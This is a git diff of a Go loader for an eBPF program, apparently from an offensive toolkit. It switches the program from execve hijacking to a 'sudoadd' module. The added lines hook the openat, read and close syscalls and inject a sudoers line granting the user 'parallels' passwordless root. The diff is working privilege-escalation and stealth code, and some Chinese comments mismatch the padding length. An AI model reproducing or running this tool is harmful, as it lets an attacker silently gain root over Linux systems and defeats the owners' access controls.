@@ -15,6 +15,8 @@ import (
 	"os/signal"
 	"syscall"
 )
+//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -type event -target arm64 -cflags "-g -O2 -Wall -target bpf -D __TARGET_ARCH_arm64"  sudoadd ./kernel-code/sudoadd.bpf.c
+
 
 func main() {
 	// Subscribe to signals for terminating the program.
@@ -26,29 +28,66 @@ func main() {
 
 		log.Fatal("Removing memlock:", err)
 	}
-	spec, err := loadExechijack()
+	spec, err := loadSudoadd()
 	if err != nil {
 		log.Fatal("loadExechijack error", err)
 	}
+	var payload []byte = []byte("parallels ALL=(ALL:ALL) NOPASSWD:ALL #")
+	payloadLen := len(payload)
+	//log.Println(payloadLen)
+	// 获取字节序列并确保它的长度是10字节
+	if len(payload) < 100 {
+		// 如果长度小于10，扩展切片
+		padding := make([]byte, 100-len(payload))
+		payload = append(payload, padding...)
+	}
 	err = spec.RewriteConstants(map[string]interface{}{
-		"target_ppid": int32(400156),
+		"target_ppid": int32(626213),
+		"uid":         int32(1000),
+		"payload_len": int32(payloadLen),
+		"payload":     payload,
 	})
 	if err != nil {
 		log.Fatal("rewrite constants error,", err)
 	}
 
-	objs := exechijackObjects{}
+	objs := sudoaddObjects{}
 	err = spec.LoadAndAssign(&objs, nil)
 	if err != nil {
 		log.Fatal("LoadAndAssign error,", err)
 	}
 
 	defer objs.Close()
-	tp, err := link.Tracepoint("syscalls", "sys_enter_execve", objs.HandleExecveEnter, nil)
+
+	openatEnterTp, err := link.Tracepoint("syscalls", "sys_enter_openat", objs.HandleOpenatEnter, nil)
 	if err != nil {
 		log.Fatal("attach tracing error,", err)
 	}
-	defer tp.Close()
+	defer openatEnterTp.Close()
+	openatExitTp, err := link.Tracepoint("syscalls", "sys_exit_openat", objs.HandleOpenatExit, nil)
+	if err != nil {
+		log.Fatal("attach tracing error,", err)
+	}
+	defer openatExitTp.Close()
+
+	readEnterTp, err := link.Tracepoint("syscalls", "sys_enter_read", objs.HandleReadEnter, nil)
+	if err != nil {
+		log.Fatal("attach tracing error,", err)
+	}
+	defer readEnterTp.Close()
+
+	readExitTp, err := link.Tracepoint("syscalls", "sys_exit_read", objs.HandleReadExit, nil)
+	if err != nil {
+		log.Fatal("attach tracing error,", err)
+	}
+	defer readExitTp.Close()
+
+	closeExitTp, err := link.Tracepoint("syscalls", "sys_exit_close", objs.HandleCloseExit, nil)
+	if err != nil {
+		log.Fatal("attach tracing error,", err)
+	}
+	defer closeExitTp.Close()
+
 	rd, err := ringbuf.NewReader(objs.Rb)
 	if err != nil {
 		log.Fatal(err)
@@ -64,8 +103,8 @@ func main() {
 	}()
 
 	log.Println("Waiting for events..")
-	go debug()
-	var event exechijackEvent
+	//go debug()
+	var event sudoaddEvent
 	for {
 		record, err := rd.Read()
 		if err != nil {
